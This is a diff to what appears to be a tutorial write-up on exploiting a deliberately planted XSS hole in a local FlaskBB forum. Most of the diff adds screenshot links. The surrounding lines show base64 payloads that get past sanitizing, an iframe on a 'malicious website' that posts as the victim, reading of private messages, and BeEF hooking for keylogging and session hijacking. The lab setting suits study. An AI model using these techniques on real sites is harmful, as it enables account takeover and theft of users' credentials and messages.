@@ -15,6 +15,8 @@ First step is to add our extra XSS "feature". We kept it simple by adding a new 
 
     localhost:8080/xss/YWxlcnQoMSkK
 
+![Demo : alert(1)](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/alert.png)
+
 The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules[A], and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[1]
 
 Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts !
@@ -66,7 +68,8 @@ Step 9 : Now, all we have to do is put it somewhere on internet and bring authen
     echo "<iframe src='http://localhost:8080/xss/$(cat payloads/post-topic.b64)'></iframe>" > malicious-website/post-topic.html
     cd malicious-website && python3 -m http.server 1337
 
-Step 10 : profit !  [[Images ?]]
+Step 10 : profit !  
+![Exploit : Post a message on behalf of a victim](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/post-topic.png)
 
 III. Read a user's private conversations.
 -----------------------------------------
@@ -101,6 +104,8 @@ When someone (test2 in my case) visits localhost:1337/read-private.html, after a
           }
         ]
 
+![Exploit : reading private messages](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/read-private.png)
+
 
 IV. Steal a user's password, and beyond ! Man In the Browser.
 -------------------------------------------------------------
@@ -116,22 +121,27 @@ Add a beef hook to our page :
 
 Start beef server, and wait for a visitor.
 
+![BeEF : ui](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-1.png)
+
 Key logger
     
     Start the Man In the Browser attack to keep the target hooked when it follows links on the current domain.
-    [SREENSHOT]
+
+![Demo : MItB](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-MItB.png)
+
     All actions and inputs are recorded under the "logs" panel.
-    [SREENSHOT]
+
+![BeEF : keylogger](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-keylogger.png)
     
 Interactive session hijacking
 
         Beef > target > use as proxy
 
-    [SREENSHOT]
+![BeEF : use as proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-useproxy.png)
 
         chromium --temp-profile --proxy-server=localhost:6789
 
-    [SREENSHOT]
+![BeEF : proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-proxy.png)
 
     Unfortunately, I couldn't manage to get it to work. The requests stay blocked somewhere between BeEF and the zombie... 
 
